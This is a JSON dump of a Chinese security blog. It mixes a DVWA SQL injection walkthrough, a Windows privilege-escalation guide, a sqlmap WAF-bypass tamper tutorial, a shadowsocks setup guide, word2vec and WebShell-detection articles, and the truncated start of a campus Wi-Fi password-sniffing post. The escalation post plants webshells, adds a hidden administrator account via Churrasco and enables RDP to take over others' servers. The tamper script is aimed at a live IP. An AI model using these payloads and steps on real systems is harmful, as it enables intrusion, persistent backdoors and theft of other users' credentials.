{"pages":[{"title":"Tags","text":"","link":"/tags/index.html"},{"title":"Categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"DVWA的SQL注入测试","text":"通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。 SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 具体来说，它是利用现有的应用出现，将（恶意）的SQL目录注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 步骤低安全等级文件包含登陆DVWA使用浏览器打开``,输入用户名密码登陆。 调整安全级别登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择SQL Injection，进入页面。 简单的ID查询提示输入User ID，输入正确的ID，将显示ID First name，Surname信息。 检测是否存在注入可以得知此处位注入点，尝试输入'，返回错误。 遍历数据库表尝试遍历数据库表，提示输入的值是ID，可以初步判断此处为数字类型的注入。尝试输入1 or 1=1，尝试遍历数据库表。 可见并没有达成目的，猜测程序将此处看成了字符型，尝试输入1' or' 1' =' 1后遍历出了数据库中所有内容。下面尝试不同语句，得到不同的结果。 查询信息列表长度利用order by [num]语句来测试查询信息列表长度，修改num的值,这里我们输入1' order by 1 --结果页面正常显示，注意–后面有空格。继续测试，1' order by 2 --，1' order by 3 --，当输入3时，页面报错。页面错误信息如下：Unknown column '3' in 'order clause'，由此我们判断查询结果值为2列。 获取数据库名称、账户名、版本及操作系统信息通过使用user()，database()，version()三个内置函数得到连接数据库的账户名、数据库名称、数据库版本信息。 首先参数注入1' and 1=2 union select 1,2 --(注意–后有空格)。 由上图得知，First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。 通过注入1' and 1=2 union select user(),database() --得到数据库用户为root@localhost及数据库名dvwa 通过注入1' and 1=2 union select version(),database() --得到数据库版本信息，此处数据库版本为5.0.90-community-nt。 通过注入1' and 1=2 union select 1,@@global.version_compile_os from mysql.user --获得操作系统信息。 查询mysql数据库所有数据库及表通过注入1' and 1=2 union select 1,schema_name from information_schema.schemata --查询mysql数据库的所有数据库名。 这里利用mysql默认的数据库information_schema，该数据库存储了Mysql所以数据库和表的信息。如图所示 猜解表名通过注入1' and exists(select * from users) --猜解dvwa数据库中的表名。 利用1' and exists(select * from [表名])，这里测试的结果，表名为users，在真实的渗透环境中，攻击者往往关心存储管理员用户和密码信息的表。 猜解字段名猜解字段名：1' and exists(select [表名] from users) --。这里测试的字段名有first_name,last_name。 通过注入1' and exists(select first_name from users) --和1' and exists(select last_name from users) --猜解字段名。 爆出数据库中字段内容注入1' and 1=2 union select first_name,last_name from users --，这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。 代码分析low等级源代码如图所示 通过代码可以看出，对输入$id的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。 中等等级代码分析将DVWA安全级别调整位medium，查看源代码。 通过源代码可以看出，在中等级别时对输入的$id值使用mysql_real_eascape_string()函数进行了处理。在PHP中，使用mysql_real_eascape_string()函数用来转移SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字转换一下编码格式即可绕过该防护函数。比如URL编码等方式。 同时发现SQL语句中变成了“WHRER user_id = “$id” ，此处变成了数字型注入，所以此处使用mysql_real_eascape_string()函数并没有起到防护作用。可以通过类似于1 or 1=1的语句来进行注入。 高等级代码分析将DVWA安全级别调整为high，查看源代码。 从源代码可以看出，此处为字符型注入。对传入$id的值使用stripslashes()函数处理以后，再经过到$mysql_real_escape_string()函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行addslashes(),addslashes()函数返回在部分与定义之前添加\\。 Striptslashes()函数则是删除由addslashes()函数添加的反斜杠。在使用两个函数进行过滤之后再使用is_numric()函数检查$id值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。","link":"/2017/02/06/DVWA-SQL-injection-test/"},{"title":"Windows服务器提权和开启3389远程连接","text":"系统为了都有有权限管理系统，根据权限高低来决定用户在这台机器上能做的事。 比如有的文件规定了低权限用户是无法读写的，而这些文件通常是我们想要获取的敏感文件。 有的文件夹是规定不能读写的，那么我们就不能上传任何到这个文件夹，也无法从这个文件夹里运行任何程序，所以我们连接上服务器都要找一个可读可写的文件夹来继续上传我们需要的程序，如开后门的程序。 一般的网站都存储在服务器权限比较低的文件夹里， 所以即使我们上传了WebShell，最多也只能够对网站所在的文件夹操作，而不能完整的控制整个服务器。所以我们需要进行提权，以一个权限相当高的用户来访问该服务器。 Windows中以用户组来分配权限，每个用户组有不同的权限，其中最高权限用户组是Administrators组，拥有对整个系统进行操作system权限。每个用户组下可以创建多个用户。 在Win10以前的Windows系统版本中，可以通过 右键此电脑=》管理=》系统工具=》本地用户和组来查看用户组及用户组中的用户。 0x01 大马和菜刀我试过各种大马，功能其实都大同小异，不过不知道是不是我使用的原因，里面的cmd并不怎么好用。大马里我个人觉得最有用的就是查看文件权限属性的功能，这个使我们在找后门上传点的时候是非常好用的，并且这个功能在菜刀里是没有的。 这种php大马可以在Perms项下看到文件的读写权限属性。 而菜刀比较好的的就是比较适合人类查看的文件目录界面，和虚拟终端。所以通常将两者结合起来用。右键任意可执行文件打开虚拟终端。 0x02 巴西烤肉提权创建系统用户的命令如下： 新建一个用户 1net user [username] [password] /add 添加到Administrators用户组 1net localgroup Administrators [username] /add 激活用户 1net user [username] /active:yes 由于一般网站被放在服务器中权限比较低的文件夹中，因此直接创建Administrator用户的命令是不被执行的。 巴西烤肉是一个非常强劲的程序，它可以无视拒绝强制执行cmd命令，经常被用到提权中。 我们通过菜刀将cmd.exe和巴西烤肉上传到网站文件夹中。 然后右键cmd.exe打开虚拟终端，先将终端路径设置为我们自己上传的cmd.exe，再尝试直接创建用户，报错命令被拒绝执行。（其实这里是一个Ubuntu Linux服务器） ====================================================================== 由于后来没找到Windows服务器的网站模板，因此下面就不带图了，过程全部手打还原，谅解 ====================================================================== 先将终端路径设置为我们自己上传的cmd.exe 1SETP ../../www/uploads/cmd.exe 再用巴西烤肉强制执行命令。巴西烤肉语法：Churrasco.exe “your command” 1Chu.exe &quot;net user [username] [password] /add &amp; net localgroup Administrators [username] /add&quot; 若无报错，那么我们就已经成为系统管理员账户了。查看当前用户会发现我们创建的用户： 1net user 至此，我们已经创建了超级权限的用户，已经可以对整个服务器进行操作了。但是在终端里操作总有些不方便，下面我们介绍一下拿下权限后如何远程连接进行桌面操作。 0x03 3389端口服务远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的Windows都有客户端所需软件。服务端电脑方面，默认听取送到TCP3389端口的数据。【百度百科】 这是一种非常方便的对服务器的操作方式，一般的网站管理员都会开启3389端口远程桌面服务。而有的安全素养比较高的管理员则会选择将3389端口关闭，甚至开启防火墙禁止任何开启3389的操作。 闲扯一下，最近Shadow Broker泄露的NSA的工具，内网里开3389的服务器一打一个准，有空的可以去玩玩。misterch0c/shadowbroker 在无防火墙的情况下，我们可以用cmd命令来添加注册表开启3389端口，或者使用别人留下的工具。 cmd命令 将以下命令写入一个.bat文件，将其拖入服务器可读写目录执行，即可开启3389端口。 此种对Windows XP 和2003系统有用，不用重起 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 写好的程序 1Chu.exe &quot;kai3389.exe&quot; 就行了 在有防火墙的情况下，需将防火墙先关闭，再用lcx.exe将3389映射到其他端口上，这个等我搞懂了再写。 0x04 RDP远程桌面连接创建好用户，开启远程桌面功能，就可以用此用户远程登陆别人的服务器直接进行桌面操作，岂不是美滋滋。 Win+R 打开【运行】窗口，运行 1mstsc /admin 用直接创建的用户名和密码登录，OK。","link":"/2017/04/20/Win-getshell-and-open-rdp/"},{"title":"基于KVM架构的VPS服务器搭建ss及锐速优化教程","text":"由于最近需要科学上网，整理了这个SS搭建及优化的教程，适用于所有KVM技术的VPS，希望对喜欢折腾的朋友能起到一定的参考作用。 准备 KVM架构虚拟服务器 xshell 服务器 任意一家运营商的KVM架构VPS服务器 Ubuntu 14.04 64bit系统 运行apt-get install vim 安装vim 搭建shadowsocks环境使用xshell连接服务器主机 安装shadowsocks服务端12apt-get install python-pippip install shadowsocks 配置shadowsocks 用vim新建shadowsocks.json文件 1vim /etc/shadowsocks.json 复制以下内容进去 1234567891011121314{ &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;port_password&quot;:{ &quot;10000&quot;:&quot;Password1&quot;, &quot;10001&quot;:&quot;Password2&quot;, &quot;10002&quot;:&quot;Password3&quot;, &quot;10003&quot;:&quot;Password4&quot; }, &quot;timeout&quot;: 300, &quot;method&quot;:&quot;rc4-md5&quot;, &quot;fast_open&quot;: true} “10000”是指端口，“Password1”是指此端口的密码，均可以随意设置 常用 vim 操作自己百度，如果 vim 命令不可用是因为没安装 vim，可以用 vi 替代 保存刚才的文档，然后启动 shadowsocks 服务（每次重启服务器后都必须再 次执行下面的命令） ： 1ssserver -c /etc/shadowsocks.json -d start 锐速优化（可选）锐速现在最低套餐是 300 元一年，新手不建议使用，如需使用百度锐速官网 更换内核查询当前内核 输入以下命令查询当前内核 1uname -r 安装指定内核 目前锐速最高支持linux-image-3.13.0-46-generic内核，运行以下命令安装此内核 1apt-get install linux-image-3.13.0-46-generic 卸载其他内核 运行命令查询本系统的其他内核 1sudo dpkg --get-selections | grep linux-image 实例，查询出有其他5个内核 12345linux-image-3.16.0-30-genericlinux-image-3.16.0-60-genericlinux-image-extra-3.16.0-30-genericlinux-image-extra-3.16.0-60-genericlinux-image-generic-lts-utopic 运行命令卸载其他内核 1sudo apt-get remove linux-image-3.16.0-30-generic linux-image-3.16.0-60-generic linux-image-extra-3.16.0-30-generic linux-image-extra-3.16.0-60-generic linux-image-generic-lts-utopic 删除后执行grub更新和重启 12sudo update-grubsudo reboot now 固定内核版本 防止内核意外升级 1sudo apt-mark hold linux-image 优化内核 使用vim打开limits.conf 1vim /etc/security/limits.conf 然后添加下面语句 12* soft nofile 51200* hard nofile 51200 修改/etc/pam.d/common-session,加入以下内容 1session required pam_limits.so 修改/etc/profile,最下面加入以下内容 1ulimit -SHn 51200 修改/etc/sysctl.conf,加入以下内容 1234567891011121314151617fs.file-max = 51200net.core.rmem_max = 67108864net.core.wmem_max = 67108864net.core.netdev_max_backlog = 250000net.core.somaxconn = 4096net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 0net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.ip_local_port_range = 10000 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_rmem = 4096 87380 67108864net.ipv4.tcp_wmem = 4096 65536 67108864net.ipv4.tcp_mtu_probing = 1net.ipv4.tcp_congestion_control = hybla 保存修改后执行 sysctl -p 使配置生效。 再额外使用一次 sudo reboot now 重启以生效。 安装锐速安装 输入以下命令安装锐速： 123wget http ://my.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gztar -xzvf serverSpeederInstaller.tar.gzsudo bash serverSpeederInstaller.sh 安装过程中依次输入以下命令： 12345678你的锐速邮箱你的锐速密码eth0100000010000000yy 优化锐速 打开/serverspeeder/etc/config，编辑如下内容： 1234rsc=&quot;1&quot;gso=&quot;1&quot;maxmode=&quot;1&quot;advinacc=&quot;1&quot; 重启 重启锐速完成优化 1service serverSpeeder restart 开机启动添加路径 在/etc/init.d目录下新建ss_start文件并加入如下内容： 1nohup /usr/local/bin/ss-server -c /etc/shadowsocks.json &gt; /dev/null 2&gt;&amp;1 &amp; 在/etc/init.d目录下新建rs_start文件并加入如下内容： 1/serverspeeder/bin/serverSpeeder.sh start 加权限12chmod +x /etc/init.d/ss_startchmod +x /etc/init.d/rs_start 加自启12sudo update-rc.d ss_start defaults 91sudo update-rc.d rs_start defaults 91 安全措施 关闭 ping 功能： 根据我的经验，如果不关闭 ping，会经常有黑客试探攻击服务器，所以最好 关闭 ping 服务，只需要每次启动或者重启服务器后执行一行代码： 1echo &quot;1&quot; &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all 至此，搭建+优化SS全过程已完毕。","link":"/2016/10/25/kvm-vps-ss-rs/"},{"title":"sqlmap tamper 脚本编写","text":"sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 使用方法： 1sqlmap.py XXXXX -tamper &quot;模块名&quot; sqlmap脚本的tamper目录下有很多自带的tamper脚本，可以用来绕过特定的waf。 这篇文章讲的很详细：sqlmap的tamper详解：http://www.myh0st.cn/index.php/archives/881/ lowercase.py我们从sqlmap自带的escapequotes.py了解tamper的结构。 这个脚本的作用是将单引号转换成 \\‘ ，双引号转换成 \\“ ，用于过滤了单引号或双引号的情况 1234567891011121314151617#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'for copying permission\"\"\"from lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): \"\"\" Slash escape single and double quotes (e.g. ' -&gt; \\') &gt;&gt;&gt; tamper('1\" AND SLEEP(5)#') '1\\\\\\\\\" AND SLEEP(5)#' \"\"\" return payload.replace(\"'\",\"\\\\'\").replace('\"', '\\\\\"') 可以看到tamper脚本的基本结构为 priority 变量定义和 dependencies 、 tamper 函数定义。 priority 定义脚本的优先级，用于有多个tamper脚本的情况。 dependencies 函数声明该脚本适用或不适用的范围，可以为空。 tamper 是主要的函数，接受的参数为 payload 和 **kwargs ，返回值为替换后的payload。 priority在自带的tamper脚本中一共有以下几种优先级 还可以自定义 -100~100 1234567__priority__ = PRIORITY.LOWEST__priority__ = PRIORITY.LOWER__priority__ = PRIORITY.LOW__priority__ = PRIORITY.NORMAL__priority__ = PRIORITY.HIGH__priority__ = PRIORITY.HIGHER__priority__ = PRIORITY.HIGHEST dependencies函数dependencies 函数，对tamper脚本支持/不支持使用的环境进行声明，可以为空，如： 123456import os from lib.core.commonimport singleTimeWarnMessagedef dependencies(): singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" %(os.path.basename(__file__).split(\".\")[0], DBMS.ACCESS))#singleTimeWarnMessage() 用于在控制台中打印出警告信息 tamper函数tamper是整个脚本的主体。主要用于修改原本的payload，返回值为替换后的payload。 比如Kzone中通过Unicode编码关键字中的字符来绕过waf。 123456789101112131415def tamper(payload, **kwargs): payload = payload.lower() payload = payload.replace('u', 'u0075') payload = payload.replace('o', 'u006f') payload = payload.replace('i', 'u0069') payload = payload.replace(''', 'u0027') payload = payload.replace('\"', 'u0022') payload = payload.replace(' ', 'u0020') payload = payload.replace('s', 'u0073') payload = payload.replace('#', 'u0023') payload = payload.replace('&gt;', 'u003e') payload = payload.replace('&lt;', 'u003c') payload = payload.replace('-', 'u002d') payload = payload.replace('=', 'u003d') return payload kwargs在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header 12345# sqlmap/tamper/vanrish.pydef tamper(payload, **kwargs): headers = kwargs.get(\"headers\", {}) headers[\"X-originating-IP\"] = \"127.0.0.1\" return payload 结语恰当的使用或者编写特定的tamper脚本能够省去很多不必要的麻烦。 且编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用 如 __priority__=PRIORITY.LOWER 来源于 sqlmap/lib/core/enums.py 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'for copying permission\"\"\"class PRIORITY: LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100.... class DBMS: ACCESS = \"Microsoft Access\" DB2 = \"IBM DB2\" FIREBIRD = \"Firebird\" MAXDB = \"SAP MaxDB\" MSSQL = \"Microsoft SQL Server\" MYSQL = \"MySQL\" ORACLE = \"Oracle\" PGSQL = \"PostgreSQL\" SQLITE = \"SQLite\" SYBASE = \"Sybase\" HSQLDB = \"HSQLDB\" INFORMIX = \"Informix\"class DBMS_DIRECTORY_NAME: ACCESS = \"access\" DB2 = \"db2\" FIREBIRD = \"firebird\" MAXDB = \"maxdb\" MSSQL = \"mssqlserver\" MYSQL = \"mysql\" ORACLE = \"oracle\" PGSQL = \"postgresql\" SQLITE = \"sqlite\" SYBASE = \"sybase\" HSQLDB = \"hsqldb\" INFORMIX = \"informix\" 实例一个替换关键字为空的waf 不使用脚本 1python27 sqlmap.py -u &quot;http://47.106.142.99:8008/list.php?id=1&quot; -D ctf --tables 编写脚本 test.py 1234567891011121314151617181920212223#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE'for copying permission\"\"\"from lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies(): passdef tamper(payload, **kwargs): payload=payload.lower() payload=payload.replace('/*','//**') payload=payload.replace('select','SeLselecteCt') payload=payload.replace('union','UnunionIoN') payload=payload.replace('and','Anandd') payload=payload.replace('sleep','SlesleepEp') payload=payload.replace('or','oorr') return payloadpython27 sqlmap.py -u \"http://47.106.142.99:8008/list.php?id=1\" --tamper=test -D ctf --tables","link":"/2018/03/21/sqlmap-tamper-development/"},{"title":"Word2vec的文档表示方法","text":"Word2vec是一种将文本转化为词向量的算法，即将词条映射为一个定长的连续的稠密向量，由这些向量构成一个向量空间，该向量的维数可以在事前确定，一般可以为50维或100维。 例如： 1234Apple = [1.2,0.2,0.3,0.5]Pear = [0.1,0.3,0.5,1.5]Banana = [2.2,0.2,0.4,0.6]Orange = [0.6,0.1,1.0,0.2] 每个词被表示成一个[1,4]的向量矩阵。 在文本处理的任务中直接处理的是文当，而一个文本中包含很多词，所以需要将文本想办法用Word2vec向量表示 。这里有两种思路： 直接将各个词的词向量串接起来，将整个文档表示成一个三维的向量 将文本中各个词的词向量相加求平均，由最终的平均向量代表整个文本 三维文档向量处理如图所示： 最终将文档表示成一个[M, P, F]三维向量，其中M代表文档个数，P代表每个文档的长度，为了便于神 经网络处理会将P处理成统一 长度，F代表最大特征值，即Word2vec训练出的向量大小。 这种表示方法CNN处理效果较好。 代码实例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#为了统一文本长度，设置最大文本长度，超过的截断，不足的用0.向量补齐max_document_length = 500#最大特征长度，即训练的词向量维度max_feature = 200def getVecsByWord2Vec(model, corpus, size): global max_document_length all_vectors = [] embeddingDim = model.vector_size #0.向量，用于填充 embeddingUnknown = [0. for i in range(embeddingDim)] #逐句获取词向量并拼接 for text in corpus: this_vector = [] #切除掉最大文档长度后的词 text = text[:max_document_length] #逐词获取词向量并拼接 for i,word in enumerate(text): if word in model.wv.vocab: this_vector.append(model[word]) else: this_vector.append(embeddingUnknown) #不足长度的填充至最大文档长度 dim = np.shape(this_vector) if dim[0] &lt; max_document_length: pad_length = max_document_length-i-1 for n in range(0,pad_length): this_vector.append(embeddingUnknown) all_vectors.append(this_vector) x = np.array(all_vectors) return xdef get_feature_by_opcode_word2vec(): global max_document_length x = [] y = [] # 若有三维文档向量直接加载 if os.path.exists(wv_data_pkl_file) and os.path.exists(label_pkl_file): f = open(wv_data_pkl_file, 'rb') x = pickle.load(f) f.close() f = open(label_pkl_file, 'rb') y = pickle.load(f) f.close() else: # 导入训练数据，自定 x, y = load_data_pkl_file() cores=multiprocessing.cpu_count() #若有训练好的词向量模型则直接加载 if os.path.exists(word2vec_bin): print \"Find cache file %s\" % word2vec_bin model=gensim.models.Word2Vec.load(word2vec_bin) #若没有则训练再保存词向量模型 else: model=gensim.models.Word2Vec(size=max_features, window=5, min_count=5, iter=10, workers=cores) model.build_vocab(x) model.train(x, total_examples=model.corpus_count, epochs=model.iter) model.save(word2vec_bin) #循环拼接出三维文档集合向量 x = getVecsByWord2Vec(model, x, max_features) f = open(wv_data_pkl_file, 'wb') pickle.dump(x, f) f.close() return x,y 平均词向量直接将每个文档中所有词的词向量相加求平均 ，用一个[1,F]的二维平均向量代表改文档。再将所有文档逐个拼接得到一个[M,F]的向量来表示整个文档集合。这种表示方法计算量较小 ，MLP处理效果还好，CNN效果极差。 代码实例如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#最大特征长度，即训练的词向量维度max_feature = 200def buildWordVector(model,text, size): vec = np.zeros(size).reshape((1, size)) count = 0. #逐词获取词向量并累加 for word in text: try: vec += model[word].reshape((1, size)) count += 1. except KeyError: continue #求平均向量 if count != 0: vec /= count return vecdef get_feature_by_opcode_word2vec(): global max_document_length x = [] y = [] # 若有三维文档向量直接加载 if os.path.exists(wv_data_pkl_file) and os.path.exists(label_pkl_file): f = open(wv_data_pkl_file, 'rb') x = pickle.load(f) f.close() f = open(label_pkl_file, 'rb') y = pickle.load(f) f.close() else: # 导入训练数据，自定 x, y = load_data_pkl_file() cores=multiprocessing.cpu_count() #若有训练好的词向量模型则直接加载 if os.path.exists(word2vec_bin): print \"Find cache file %s\" % word2vec_bin model=gensim.models.Word2Vec.load(word2vec_bin) #若没有则训练再保存词向量模型 else: model=gensim.models.Word2Vec(size=max_features, window=5, min_count=5, iter=10, workers=cores) model.build_vocab(x) model.train(x, total_examples=model.corpus_count, epochs=model.iter) model.save(word2vec_bin) #循环拼接出二维文档集合向量 x= np.concatenate([buildWordVector(model,z, max_features) for z in x]) #归一化 x = scale(x) f = open(wv_data_pkl_file, 'wb') pickle.dump(x, f) f.close() return x,y","link":"/2019/05/09/word2vec-presentation/"},{"title":"Use Word-NG vec to detect WebShell","text":"In order to cope with the current complex and flexible WebShell attack environment and better detect various types of webshells, an improved WebShell detection method based on CNN was proposed by improving text feature extraction and convolutional neural network structure. First, precompile the PHP data set to get the opcode instruction sequence. Secondly, Word2vec is used to extract the word vectors of the original text and the phrase segmented by bi-gram respectively, and it serves as the two inputs of the convolutional neural network. Finally, the detection is carried out through the designed convolutional neural network. Through experiments, this method effectively improves the accuracy, recall rate and other performance parameters while compared with other methods. See repo at https://github.com/liyuanzi/WordNG-vec_WebShell_detect IntroductionWord-NG vecIn fact, the word embedding learned in Word2vec are more reflect in semantic similarity features , such as “extract” and “take”, “compression” and “reduction”, but without taking the word order features into account. Sometimes there are some differences with the actual semantics, for example: The USA started a trade war on China The main predicates of two sentences are interchanged to express different meanings, but there is no difference in Word2Vec. However, if N-Gram is used to divide the text into word groups , we can obtain the word order feature of the text，such as: Orignal The USA started a trade war on China Word2vec “The USA”，“started”，”a”，“trade war”，“on”，“China” (vector) 2-gram “The USA/The USA” ，“The USA/started”，”stared”/a”，“a/trade war”，”trade war/on”，“on China” Combining N-Gram with Word2vec, the word vectors of the original text and 2-gram pharse are both trained by Word2vec as the general features of the text, taking into account not only the semantic features, but also the word order features. In this way, two similar sentences can be correctly classifcated. Convolutional Neural NetworkBased on the Kim Y’s TextCNN, combined with the two-channel convolutional neural network, a text classification model DCTF-CNN(Double-Channels and Trible-Filters Convolutional Neural Network) was constructed. The structure of the neural network is shown below: The model includes five layers: input layer, convolution layer, pooling layer, full-link layer and output layer.In the input layer, T1 channel and T2 channel respectively input the word vector of the original text and the word vector of the 2-gram pharse. The convolution layer is composed of three convolution kernels of different widths, each of which covers the local characteristics of different granularity.In the pooling layer, the global maximum value is pooled, and the maximum value is reserved for each convolution kernel, which can effectively extract the most representative features.Two feature vectors were spliced in the full link layer, and finally two types of distributions, namely the probability distribution of WebShell and normal files, were output through Softmax in the output layer. PHP opcodePHP is an interpreted language, and its code execution process can be divided into Lexical Analysis stage, Syntax Analysis stage, byte code compilation stage and code execution stage.The execution flow diagram is shown in the solid line section in the below: In the lexical analysis phase, the Lexer reads the source code sequence of characters in sequence and shred them into Token sequences according to PHP syntax rules.In the Syntax analysis stage, the Token sequence is read in by the Parser to be syntactically checked, and then the Abstract Syntax Tree (AST) is generated.In the bytecode compilation phase, the PHP virtual machine Zend reads in the abstract syntax tree and translates the action nodes in the syntax tree into the corresponding bytecode.In the code execution stage, the PHP virtual machine Zend loads the corresponding module according to the code call, initializes the running environment, and finally executes the bytecode instruction and outputs the result. For example, the following code: 12345&lt;?phpecho’Hello World’;$a=1+1;echo $a;?&gt; After PHP code compilation by VLD extension, the code can be compiled into following opcode: 1234ZEND_ECHO ’Hello World’ZEND_ADD ~ 0 1 1ZEND_ASSIGN!0 ~ 0ZEND_ECHI ~ 0 In this paper, the collected PHP datasets is compiled into opcode to word embedding, so as to avoid the interference of useless annotations added in the WebShell which might bypass static detection. In this way the generalization of the model could be imporved AssessmentExperimental data sets were obtained from the following sources: Type sources WebShell https://github.com/tennc/webshell https://github.com/JohnTroony/php-webshells https://github.com/ysrc/webshell-sample https://github.com/tanjiti/webshellSample https://github.com/xl7dev/WebShell Normal Page https://github.com/WordPress/WordPress https://github.com/phpmyadmin/phpmyadmin https://github.com/typecho/typecho https://github.com/bcit-ci/CodeIgniter https://github.com/laravel/laravel Remove duplicate files by md5 comparsion, a total of 2387 WebShell samples and 2316 Normal Page samples were obtained. The WebShell samples covers One-word Trojan, small Trojan and giant Trojan all types of WebShell. The Normal Page covers blog cms，php development framework and database management system, and the similar page was remove to optimize data sets. UsageDownload code and data sets 1git clone https://github.com/liyuanzi/WordNG-vec_WebShell_detect This code requires Python2.7 1conda create --name py27 python=2.7 Initialization environment 1pip install -r requerments.txt start trainning 1$ nohup python -u webshell.py &gt;dctf.txt 2&gt;&amp;1 &amp; tail -f dctf.txt The word embedding process takes a very long time，use nohup to avoid the word embedding process fail because the terminal closed unexpectly. The result is loaded into dctf.txt ExampleA Comparsion examination on a small size data sets . features Accuracy Precision Recall F1-score 2-gram 0.798 0.714 0.196 0.308 opcode sequences 0.969 0.998 0.823 0.902 Word2vec 0.958 0.994 0.918 0.954 bigram-word2vec 0.960 0.978 0.937 0.958 Word-NG vec 0.984 0.995 0.971 0.982","link":"/2019/05/09/Wordng-vec-webshell-detect/"},{"title":"H3C校园网WIFI密码嗅探实验","text":"某高校校区的校园网WIFI的采用H3C的Web认证，在网页里输入学号和密码，post出去，你的这个mac地址就可以上网了。此方式不是wpa/wpa2，也不是802.1x，而只是单纯的web认证，是大有文章可做的。因此我想是否能在开放无线网环境中抓取到登陆时认证发送的数据包，从中取出用户名和密码。 参考Freebuf的如何在开放无线网络中嗅探校园网密码**这篇文章提供的python脚本，针对该校的网络进行了一些修改，使用该脚本嗅探校园网WIFI账号密码。 初步分析认证交互该校校园网WIFI采用H3C认证，认证地址为内网某服务器上。url为http://192.168.xxx.x:xxxx/portal/index_default.jsp 查看DOM发现了几个重要的函数。base64()、checkUserName()、encrypt() base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。 base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。 分析网络流首先使用火狐的firebug+检查元素来分析网络流。 当我们访问登陆页面时，发送GET请求并带一个i_p_pl的cookie 尝试登陆，登陆成功跳转到http://192.168.xxx.x:xxxx/portal/page/loginSucc.jsp**，发送了*个GET请求，除去图片和脚本，此次登陆只向/portal/loginSucc.jsp发送了GET包，除了i_p_pl，还带有hello1、hello2两个个cookie，其中hello1为登陆发送的username，hello2暂不明其含义。 在后来的测试中，发现hello2是【记住登陆】功能的参数，当hello2=false时不记住，hello2=true时记住并附带hello3、hello4、hello5参数，本来应当是可以利用这些cookie来绕过登陆直接请求认证的，不过考虑到其又要增加工作量，因此先放一边。 这就很奇怪了，在整个登陆过程全部都是GET请求而没有POST请求，没有POST请求是怎么把用户名密码传输上去认证的呢？况且之前已经在DOM中发现了base64encode()和query()函数。难道用户名和密码是在GET时Cookie中传上去的？。虽然不用想就知道GET发送cookie来登陆很扯，但还是要研究一下cookie的含义。 探究cookie含义登陆时发送的i_p_pl 